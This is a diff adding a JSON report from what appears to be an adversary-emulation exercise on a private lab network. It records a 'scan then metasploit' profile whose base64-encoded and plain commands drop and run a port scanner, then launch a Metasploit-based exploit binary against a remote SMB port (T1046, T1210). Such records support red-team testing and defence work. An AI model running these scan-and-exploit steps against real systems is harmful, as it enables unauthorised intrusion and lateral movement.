@@ -1,0 +1,369 @@
+{
+    "name": "oops",
+    "id": 1,
+    "host_group": [
+        {
+            "id": 1,
+            "paw": "kali$root",
+            "last_seen": "2020-02-12 18:56:39",
+            "architecture": "amd64",
+            "platform": "linux",
+            "server": "http://192.168.1.250:8888",
+            "host_group": "my_group",
+            "location": "/tmp/sandcat-linux",
+            "pid": 43158,
+            "ppid": 33730,
+            "trusted": 1,
+            "last_trusted_seen": "2020-02-12 18:56:39",
+            "sleep_min": 10,
+            "sleep_max": 10,
+            "executors": [
+                {
+                    "executor": "sh",
+                    "preferred": 1
+                },
+                {
+                    "executor": "pwsh",
+                    "preferred": 0
+                },
+                {
+                    "executor": "shellcode_amd64",
+                    "preferred": 0
+                }
+            ]
+        }
+    ],
+    "start": "2020-02-12 18:54:30",
+    "facts": [
+        {
+            "id": 8,
+            "property": "file.sensitive.extension",
+            "value": "txt",
+            "score": 1,
+            "set_id": 0,
+            "source_id": "2",
+            "link_id": null
+        },
+        {
+            "id": 9,
+            "property": "file.sensitive.extension",
+            "value": "yml",
+            "score": 1,
+            "set_id": 0,
+            "source_id": "2",
+            "link_id": null
+        },
+        {
+            "id": 10,
+            "property": "host.service.modifiable",
+            "value": "fax",
+            "score": 1,
+            "set_id": 0,
+            "source_id": "2",
+            "link_id": null
+        },
+        {
+            "id": 11,
+            "property": "target.org.name",
+            "value": "mitre.org",
+            "score": 1,
+            "set_id": 0,
+            "source_id": "2",
+            "link_id": null
+        },
+        {
+            "id": 16,
+            "property": "remote.host.ip",
+            "value": "192.168.1.107",
+            "score": 9,
+            "set_id": 0,
+            "source_id": "2",
+            "link_id": null
+        },
+        {
+            "id": 17,
+            "property": "remote.host.socket",
+            "value": "192.168.1.107:445",
+            "score": 1,
+            "set_id": 0,
+            "source_id": "4",
+            "link_id": 1
+        }
+    ],
+    "finish": "2020-02-12 18:56:39",
+    "planner": {
+        "id": 1,
+        "name": "sequential",
+        "module": "plugins.stockpile.app.sequential",
+        "params": {}
+    },
+    "adversary": {
+        "id": 21,
+        "adversary_id": "8d48c388-b2ee-4293-8e80-2adce1b0f47c",
+        "name": "scan then metasploit",
+        "description": "scan host and then metasploit",
+        "phases": {
+            "1": [
+                {
+                    "id": 31,
+                    "ability_id": "47abe1f5-55a5-46cc-8cad-506dac8ea6d9",
+                    "tactic": "discovery",
+                    "technique_name": "Network Service Scanning",
+                    "technique_id": "T1046",
+                    "name": "Scan IP for ports",
+                    "test": "Y2htb2QgK3ggc2Nhbm5lci5lbGYgJiYKLi9zY2FubmVyLmVsZiAtaSAje3JlbW90ZS5ob3N0LmlwfQ==",
+                    "description": "Use dropped scanner to find open popular ports",
+                    "cleanup": "",
+                    "executor": "sh",
+                    "platform": "darwin",
+                    "parser": [
+                        {
+                            "ability": 31,
+                            "name": "line",
+                            "property": "remote.host.socket",
+                            "script": ""
+                        }
+                    ],
+                    "payload": [
+                        {
+                            "ability": 31,
+                            "payload": "scanner.elf"
+                        }
+                    ],
+                    "adversary_map_id": 96
+                },
+                {
+                    "id": 32,
+                    "ability_id": "47abe1f5-55a5-46cc-8cad-506dac8ea6d9",
+                    "tactic": "discovery",
+                    "technique_name": "Network Service Scanning",
+                    "technique_id": "T1046",
+                    "name": "Scan IP for ports",
+                    "test": "Y2htb2QgK3ggc2Nhbm5lci5lbGYgJiYKLi9zY2FubmVyLmVsZiAtaSAje3JlbW90ZS5ob3N0LmlwfQ==",
+                    "description": "Use dropped scanner to find open popular ports",
+                    "cleanup": "",
+                    "executor": "sh",
+                    "platform": "linux",
+                    "parser": [
+                        {
+                            "ability": 32,
+                            "name": "line",
+                            "property": "remote.host.socket",
+                            "script": ""
+                        }
+                    ],
+                    "payload": [
+                        {
+                            "ability": 32,
+                            "payload": "scanner.elf"
+                        }
+                    ],
+                    "adversary_map_id": 96
+                },
+                {
+                    "id": 34,
+                    "ability_id": "47abe1f5-55a5-46cc-8cad-506dac8ea6d9",
+                    "tactic": "discovery",
+                    "technique_name": "Network Service Scanning",
+                    "technique_id": "T1046",
+                    "name": "Scan IP for ports",
+                    "test": "c2Nhbm5lci5leGUgLWkgI3tyZW1vdGUuaG9zdC5pcH0=",
+                    "description": "Use dropped scanner to find open popular ports",
+                    "cleanup": "",
+                    "executor": "cmd",
+                    "platform": "windows",
+                    "parser": [
+                        {
+                            "ability": 34,
+                            "name": "line",
+                            "property": "remote.host.socket",
+                            "script": ""
+                        }
+                    ],
+                    "payload": [
+                        {
+                            "ability": 34,
+                            "payload": "scanner.exe"
+                        }
+                    ],
+                    "adversary_map_id": 96
+                },
+                {
+                    "id": 33,
+                    "ability_id": "47abe1f5-55a5-46cc-8cad-506dac8ea6d9",
+                    "tactic": "discovery",
+                    "technique_name": "Network Service Scanning",
+                    "technique_id": "T1046",
+                    "name": "Scan IP for ports",
+                    "test": "Li9zY2FubmVyLmV4ZSAtaSAje3JlbW90ZS5ob3N0LmlwfQ==",
+                    "description": "Use dropped scanner to find open popular ports",
+                    "cleanup": "",
+                    "executor": "psh",
+                    "platform": "windows",
+                    "parser": [
+                        {
+                            "ability": 33,
+                            "name": "line",
+                            "property": "remote.host.socket",
+                            "script": ""
+                        }
+                    ],
+                    "payload": [
+                        {
+                            "ability": 33,
+                            "payload": "scanner.exe"
+                        }
+                    ],
+                    "adversary_map_id": 96
+                }
+            ],
+            "2": [
+                {
+                    "id": 233,
+                    "ability_id": "47c04fce-7354-4cfa-8922-4b0c1369c7b1",
+                    "tactic": "lateral-movement",
+                    "technique_name": "Exploitation of Remote Services",
+                    "technique_id": "T1210",
+                    "name": "Exploit Socket With Metasploit",
+                    "test": "Y2htb2QgK3ggbWV0YXNwbG9pdF9leHBsb2l0X3BvcnQuZWxmICYmCi4vbWV0YXNwbG9pdF9leHBsb2l0X3BvcnQuZWxmIC0tdGFyZ2V0ICN7cmVtb3RlLmhvc3Quc29ja2V0fQ==",
+                    "description": "Use Metasploit to Broadly Exploit a Remote Port",
+                    "cleanup": "",
+                    "executor": "sh",
+                    "platform": "darwin",
+                    "parser": [
+                        {
+                            "ability": 233,
+                            "name": "line",
+                            "property": "remote.vuln.metasploit",
+                            "script": ""
+                        }
+                    ],
+                    "payload": [
+                        {
+                            "ability": 233,
+                            "payload": "metasploit_exploit_port.elf"
+                        }
+                    ],
+                    "adversary_map_id": 97
+                },
+                {
+                    "id": 232,
+                    "ability_id": "47c04fce-7354-4cfa-8922-4b0c1369c7b1",
+                    "tactic": "lateral-movement",
+                    "technique_name": "Exploitation of Remote Services",
+                    "technique_id": "T1210",
+                    "name": "Exploit Socket With Metasploit",
+                    "test": "Y2htb2QgK3ggbWV0YXNwbG9pdF9leHBsb2l0X3BvcnQuZWxmICYmCi4vbWV0YXNwbG9pdF9leHBsb2l0X3BvcnQuZWxmIC0tdGFyZ2V0ICN7cmVtb3RlLmhvc3Quc29ja2V0fQ==",
+                    "description": "Use Metasploit to Broadly Exploit a Remote Port",
+                    "cleanup": "",
+                    "executor": "sh",
+                    "platform": "linux",
+                    "parser": [
+                        {
+                            "ability": 232,
+                            "name": "line",
+                            "property": "remote.vuln.metasploit",
+                            "script": ""
+                        }
+                    ],
+                    "payload": [
+                        {
+                            "ability": 232,
+                            "payload": "metasploit_exploit_port.elf"
+                        }
+                    ],
+                    "adversary_map_id": 97
+                },
+                {
+                    "id": 235,
+                    "ability_id": "47c04fce-7354-4cfa-8922-4b0c1369c7b1",
+                    "tactic": "lateral-movement",
+                    "technique_name": "Exploitation of Remote Services",
+                    "technique_id": "T1210",
+                    "name": "Exploit Socket With Metasploit",
+                    "test": "bWV0YXNwbG9pdF9leHBsb2l0X3BvcnQuZXhlIC0tdGFyZ2V0ICN7cmVtb3RlLmhvc3Quc29ja2V0fSAtLXNlcnZlciAje3NlcnZlcn0=",
+                    "description": "Use Metasploit to Broadly Exploit a Remote Port",
+                    "cleanup": "",
+                    "executor": "cmd",
+                    "platform": "windows",
+                    "parser": [
+                        {
+                            "ability": 235,
+                            "name": "line",
+                            "property": "remote.vuln.metasploit",
+                            "script": ""
+                        }
+                    ],
+                    "payload": [
+                        {
+                            "ability": 235,
+                            "payload": "metasploit_exploit_port.exe"
+                        }
+                    ],
+                    "adversary_map_id": 97
+                },
+                {
+                    "id": 234,
+                    "ability_id": "47c04fce-7354-4cfa-8922-4b0c1369c7b1",
+                    "tactic": "lateral-movement",
+                    "technique_name": "Exploitation of Remote Services",
+                    "technique_id": "T1210",
+                    "name": "Exploit Socket With Metasploit",
+                    "test": "Li9tZXRhc3Bsb2l0X2V4cGxvaXRfcG9ydC5leGUgLS10YXJnZXQgI3tyZW1vdGUuaG9zdC5zb2NrZXR9IC0tc2VydmVyICN7c2VydmVyfQ==",
+                    "description": "Use Metasploit to Broadly Exploit a Remote Port",
+                    "cleanup": "",
+                    "executor": "psh",
+                    "platform": "windows",
+                    "parser": [
+                        {
+                            "ability": 234,
+                            "name": "line",
+                            "property": "remote.vuln.metasploit",
+                            "script": ""
+                        }
+                    ],
+                    "payload": [
+                        {
+                            "ability": 234,
+                            "payload": "metasploit_exploit_port.exe"
+                        }
+                    ],
+                    "adversary_map_id": 97
+                }
+            ]
+        }
+    },
+    "jitter": "4/8",
+    "steps": [
+        {
+            "ability_id": "47abe1f5-55a5-46cc-8cad-506dac8ea6d9",
+            "paw": "kali$root",
+            "command": "chmod +x scanner.elf &&./scanner.elf -i 192.168.1.107",
+            "delegated": "2020-02-12 18:54:35.651959",
+            "run": "2020-02-12 18:54:35",
+            "status": 0,
+            "description": "Use dropped scanner to find open popular ports",
+            "name": "Scan IP for ports",
+            "attack": {
+                "tactic": "discovery",
+                "technique_name": "Network Service Scanning",
+                "technique_id": "T1046"
+            }
+        },
+        {
+            "ability_id": "47c04fce-7354-4cfa-8922-4b0c1369c7b1",
+            "paw": "kali$root",
+            "command": "chmod +x metasploit_exploit_port.elf &&./metasploit_exploit_port.elf --target 192.168.1.107:445",
+            "delegated": "2020-02-12 18:54:41.661354",
+            "run": "2020-02-12 18:56:39",
+            "status": 0,
+            "description": "Use Metasploit to Broadly Exploit a Remote Port",
+            "name": "Exploit Socket With Metasploit",
+            "attack": {
+                "tactic": "lateral-movement",
+                "technique_name": "Exploitation of Remote Services",
+                "technique_id": "T1210"
+            }
+        }
+    ]
+}
